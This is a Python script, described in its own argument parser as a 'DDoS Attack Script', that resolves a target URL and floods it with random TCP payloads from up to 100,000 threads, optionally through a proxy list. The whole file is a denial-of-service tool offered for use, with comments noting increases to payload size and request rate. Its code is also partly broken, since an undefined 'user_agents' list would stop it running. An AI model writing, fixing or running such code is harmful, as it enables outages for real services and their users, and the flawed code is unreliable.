import os
import socket
import threading
import random
import logging
from queue import Queue
from time import sleep
import argparse
from urllib.parse import urlparse

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def generate_payload():
    payload_size = random.randint(4096, 16384)  # Increased payload size
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for _ in range(payload_size)).encode()

def attack_target(target_ip, target_port, user_agent, proxy=None):
    try:
        payload = generate_payload()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if proxy:
            s.settimeout(10)
            s.connect(proxy)
        else:
            s.connect((target_ip, target_port))
        s.send(payload)
        logging.info("Payload sent successfully")
        s.close()
    except Exception as e:
        logging.error(f"Attack failed: {e}")

def read_proxies(filename):
    proxies = []
    try:
        with open(filename, 'r') as file:
            for line in file:
                parts = line.strip().split(':')
                if len(parts) == 2:
                    proxy = (parts[0], int(parts[1]))
                    proxies.append(proxy)
    except FileNotFoundError:
        logging.error(f"File '{filename}' not found.")
    return proxies

def worker(queue):
    while not queue.empty():
        target_ip, target_port, user_agent, proxy = queue.get()
        attack_target(target_ip, target_port, user_agent, proxy)
        queue.task_done()
        sleep(random.uniform(0.001, 0.01))  # Reduced sleep to increase request rate

def launch_attack(target_ip, target_port):
    logging.info("Launching attack...")

    proxies = read_proxies('proxy.txt')
    user_agent = random.choice(user_agents)
    thread_count = 100000  # Further increased thread count for high traffic
    
    queue = Queue()

    for _ in range(thread_count // 2):
        queue.put((target_ip, target_port, user_agent, None))

    for proxy in proxies:
        queue.put((target_ip, target_port, user_agent, proxy))

    for _ in range(thread_count):
        thread = threading.Thread(target=worker, args=(queue,))
        thread.start()

    queue.join()

if __name__ == "__main__":
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="DDoS Attack Script")
    parser.add_argument("target_url", help="Target URL")
    parser.add_argument("target_port", type=int, help="Target port")
    args = parser.parse_args()

    # Clear the terminal screen
    os.system('cls' if os.name == 'nt' else 'clear')

    # Extract hostname from URL
    parsed_url = urlparse(args.target_url)
    hostname = parsed_url.hostname

    # Resolve URL to IP address
    try:
        target_ip = socket.gethostbyname(hostname)
    except socket.gaierror as e:
        logging.error(f"Error resolving URL {args.target_url}: {e}")
        exit(1)

    # Launch attack
    launch_attack(target_ip, args.target_port)
